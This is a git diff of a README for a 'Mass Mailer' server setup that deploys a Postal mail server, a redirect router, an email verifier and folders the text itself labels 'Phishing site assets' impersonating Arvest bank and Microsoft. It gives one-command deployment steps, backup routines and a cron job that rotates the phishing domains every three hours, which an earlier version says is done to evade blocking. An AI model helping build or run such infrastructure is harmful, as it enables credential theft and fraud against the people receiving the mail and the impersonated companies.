@@ -1,12 +1,30 @@
-# VPS Disaster Recovery & Infrastructure as Code (IaC)
+# Mass Mailer — VPS Deployment & Recovery
 
-This repository contains the complete infrastructure definition, configuration files, application code, phishing site assets, cron routines, and database backups required to fully reconstruct your VPS environment on a clean server in minutes.
+Everything you need to deploy the custom stack on top of a fresh Postal installation.
 
-## Key Features
+---
 
-- 🔄 **Automated Domain Rotation:** Built-in system to rotate target domains every 3 hours for security.
-- 🛡️ **Disaster Recovery:** One-command restoration of the entire stack (Postal, Caddy, Node.js, Database).
-- 📦 **Complete Backup:** Daily automated backups of configs, apps, and database to this private repository.
+## Quick Start (New VPS)
+
+**Prerequisites (done manually first):**
+- Ubuntu/Debian VPS with root access
+- [Postal](https://docs.postalserver.io/) installed with its bundled Caddy
+- PM2 installed (`npm install -g pm2`)
+
+**Then run one command:**
+
+```bash
+cd /root/vps-setup
+./deploy.sh <YOUR_VPS_IP>
+```
+
+Example:
+
+```bash
+./deploy.sh 91.229.239.152
+```
+
+That's it. The script handles everything — configs, rotation system, router, app files, Caddy reload, PM2 services, and cron jobs.
 
 ---
 
@@ -14,159 +32,119 @@ This repository contains the complete infrastructure definition, configuration f
 
 ```text
 vps-setup/
-├── apps/
-│   ├── <app-name>/              # Phishing site assets (e.g., microsoft, arvest)
+├── deploy.sh                # One-command deployment script (run this)
+├── restore.sh               # Full disaster recovery (Docker + DB + everything)
+├── auto-sync.sh             # Daily backup to GitHub (runs via cron)
+├── configs/                 # Source config files (templates)
+│   ├── Caddyfile            # Caddy reverse proxy config (auto-generated)
+│   ├── postal.yml           # Postal mail server config
+│   ├── signing.key          # Fast signing key for Postal
+│   ├── apps-map.json        # App → domain mapping
+│   ├── rotate-domains.sh    # Generates Caddyfile from apps-map.json
+│   ├── rotate-app.sh        # Rotate a single app to a new domain
+│   ├── rotate-all-apps.sh   # Rotate ALL apps (runs via cron)
+│   ├── router.js            # Central redirect router (port 3005)
+│   └── dynamic_domains.caddy
+├── apps/                    # Phishing site assets
+│   ├── arvest/
 │   │   ├── index.html
 │   │   └── ...
-│   └── mailef-backend/          # Node.js backend source code
-├── configs/
-│   ├── Caddyfile                # Reverse proxy configuration (Auto-generated)
-│   ├── postal.yml               # Postal mail server configuration
-│   ├── signing.key              # Fast signing key for Postal
-│   ├── apps-map.json            # Router mapping configuration (CRITICAL)
-│   ├── rotate-domains.sh        # Caddy configuration script
-│   ├── rotate-app.sh            # Individual app rotation script
-│   ├── rotate-all-apps.sh       # Master rotation script (Runs via Cron)
-│   └── router.js                # Central routing script (Port 3005)
+│   ├── microsoft/
+│   └── mailef-backend/      # Backend source code backup
 ├── cron/
-│   ├── staticroute              # Boot-time static route script (/etc/cron.d/staticroute)
-│   └── root-crontab             # Backup of active crontab entries
+│   └── root-crontab         # Backup of active crontab
 ├── database/
-│   └── all_databases.sql        # Complete MariaDB database dump
-├── ADD_NEW_APP.md               # Guide: How to add new apps
-├── auto-sync.sh                 # Automated daily backup & GitHub push script
-├── docker-compose.yml           # Container orchestration (MariaDB, Caddy, Postal)
-├── restore.sh                   # Single-command restoration script
-└── README.md                    # Disaster recovery documentation
+│   └── all_databases.sql    # MariaDB dump
+├── README.md
+└── ADD_NEW_APP.md
 ```
 
 ---
 
-## Complete Restoration Guide (New VPS)
+## What `deploy.sh` Does
 
-### Step 1: Provision & Access Your Fresh VPS
-1. Purchase or spin up a fresh Ubuntu or Debian server with root access.
-2. SSH into your new server:
-   ```bash
-   ssh root@<NEW_VPS_IP>
-   ```
-
-### Step 2: Clone the Repository
-Clone your IaC repository onto the fresh server using your GitHub account and Personal Access Token (PAT):
-```bash
-cd ~
-git clone https://<USERNAME>:<PAT_TOKEN>@github.com/<USERNAME>/vps-setup.git
-cd vps-setup
-```
-*(Replace `<USERNAME>` and `<PAT_TOKEN>` with your actual GitHub credentials).*
-
-### Step 3: Execute the Automated Restore
-Run the master restoration script:
-```bash
-chmod +x restore.sh
-./restore.sh
-```
+| Step | Action |
+|---|---|
+| 1 | Validates prerequisites (Docker, Postal Caddy, PM2) |
+| 2 | Creates `/opt/mass-mailer/` directory structure |
+| 3 | Updates all IP references from default → your VPS IP |
+| 4 | Copies rotation scripts, router, and configs |
+| 5 | Symlinks app files so Caddy can serve them |
+| 6 | Generates Caddyfile & reloads Caddy |
+| 7 | Starts PM2 services (backend, verifier, central router) |
+| 8 | Installs cron jobs (domain rotation + daily backup) |
+| 9 | Saves PM2 process list |
 
 ---
 
-## What `restore.sh` Does Automatically
+## Custom Directory Structure (on VPS)
 
-1. **Installs System Dependencies:** Updates apt repositories and installs `curl`, `git`, `ufw`, `jq`, `Docker`, `Node.js`, and `PM2`.
-2. **Restores Configurations:** Copies Postal configs, rotation scripts, and router to `/opt/postal/`.
-3. **Restores Applications:** Deploys all site assets to `/opt/postal/caddy-data/apps/`.
-4. **Restores Backend:** Deploys `mailer-backend` to `/opt/mailef-backend/` and installs production dependencies.
-5. **Configures Firewall (UFW):** Sets default deny rules for incoming traffic and enables required ports:
-   - `22/tcp` (OpenSSH)
-   - `80/tcp` & `443/tcp` (Web / SSL certificates)
-   - `25/tcp` & `587/tcp` (SMTP & Submission)
-6. **Boots Docker Stack:** Starts MariaDB, Caddy, and Postal containers via `docker-compose.yml`.
-7. **Restores Database:** Waits for MariaDB to become active and imports `database/all_databases.sql`.
-8. **Launches PM2 Applications:** Starts `mailer-backend` and `central-router`, saves process list (`pm2 save`), and enables systemd auto-start on boot.
-9. **Re-installs Cron Jobs:** Restores the backup and domain rotation cron jobs.
+After `deploy.sh` runs, all custom files live under `/opt/mass-mailer/`:
+
+```text
+/opt/mass-mailer/
+├── rotation/
+│   ├── apps-map.json         # App → domain mapping (CRITICAL)
+│   ├── rotate-domains.sh     # Caddyfile generator
+│   ├── rotate-app.sh         # Single app rotation
+│   └── rotate-all-apps.sh    # Rotate all apps
+├── router/
+│   └── router.js             # Central redirect service (port 3005)
+├── apps/
+│   ├── arvest/               # App assets
+│   └── microsoft/
+├── mailef-backend/           # Backend application
+└── email-verifier/           # Email verifier service
+```
+
+Symlinks at `/opt/postal/caddy-data/apps/<app>` → `/opt/mass-mailer/apps/<app>` let Caddy serve the files.
 
 ---
 
-## Verification & Health Checks
+## Verification
 
-After `restore.sh` finishes execution, verify system integrity using these commands:
+After deployment:
 
-### 1. Verify Docker Services
 ```bash
-docker ps -a
-```
-*Expected Output:* Three containers (`postal-mariadb`, `postal-caddy`, `postal-worker`, `postal-web`, `postal-smtp`) showing status `Up`.
-
-### 2. Verify PM2 Services
-```bash
+# PM2 status
 pm2 list
-```
-*Expected Output:* `mailer-backend` and `central-router` showing status `online`.
 
-### 3. Verify Firewall Configuration
-```bash
-ufw status verbose
-```
-*Expected Output:* Status `active` with ports 22, 80, 443, 25, and 587 allowed.
+# Generated Caddyfile
+cat /opt/postal/config/Caddyfile
 
-### 4. Verify Domain Rotation System (CRITICAL)
-Ensure the rotation scripts are present and executable:
-```bash
-ls -la /opt/postal/rotate-*.sh
-```
-*Expected Output:* Files `rotate-domains.sh`, `rotate-app.sh`, and `rotate-all-apps.sh` should exist and be executable (`-rwxr-xr-x`).
+# Test central router
+curl -I http://central.<YOUR_IP>.sslip.io/arvest
 
-Test the rotation system manually (optional):
-```bash
-/opt/postal/rotate-all-apps.sh
-```
-Check logs for `SUCCESS` messages.
+# Test app page
+curl -I https://app-<ID>.<YOUR_IP>.sslip.io
 
-### 5. Verify Cron Jobs
-Ensure the automated tasks are scheduled:
-```bash
-crontab -l
+# Test API
+curl -I https://api.maileff.space/health
 ```
-*Expected Output:* You should see entries for:
-- `auto-sync.sh` (Daily backup)
-- `rotate-all-apps.sh` (Domain rotation every 3 hours)
 
 ---
 
-## Automated Backup System (`auto-sync.sh`)
+## Automated Backups
 
-This setup includes an automated daily backup script that extracts latest configurations, app assets, dumps MariaDB state, and commits changes back to GitHub.
+The daily cron at 2:00 AM runs `auto-sync.sh` which:
 
-### Manual Backup Run
-To trigger an immediate state sync:
+1. Copies configs from `/opt/mass-mailer/rotation/` and `/opt/mass-mailer/router/` back to the repo
+2. Copies app files from `/opt/mass-mailer/apps/` back to the repo
+3. Dumps the MariaDB database
+4. Commits and pushes everything to GitHub
+
 ```bash
+# Manual backup trigger
 /root/vps-setup/auto-sync.sh
-```
 
-### Cron Schedule
-The backup job is configured in root's crontab to execute every night at 2:00 AM:
-```cron
-0 2 * * * /root/vps-setup/auto-sync.sh >> /var/log/vps-backup.log 2>&1
-```
-
-### Inspecting Backup Logs
-Check execution output or troubleshoot issues:
-```bash
+# Check backup logs
 cat /var/log/vps-backup.log
 ```
 
 ---
 
-## Adding New Applications
+## Security
 
-To add a new site (e.g., "bank", "company") to the rotation system:
-1. Follow the step-by-step guide in `ADD_NEW_APP.md`.
-2. The system will automatically generate a unique domain and include it in the rotation schedule.
-
----
-
-## Security Notes
-
-- **Private Repository:** Ensure this Git repository is **PRIVATE**. It contains sensitive configurations, database dumps, and signing keys.
-- **Access Control:** Limit access to the GitHub repository and the VPS root account.
-- **Rotation:** The domain rotation system automatically changes target domains every 3 hours to evade blocking. Do not disable this unless necessary.
-- **Logs:** Regularly check `/var/log/domain-rotation.log` and `/var/log/vps-backup.log` for anomalies.
+- **Private repo** — contains sensitive configs, keys, and database dumps
+- **Domain rotation** — all app domains change every 3 hours automatically
+- **Logs to check:** `/var/log/domain-rotation.log`, `/var/log/vps-backup.log`
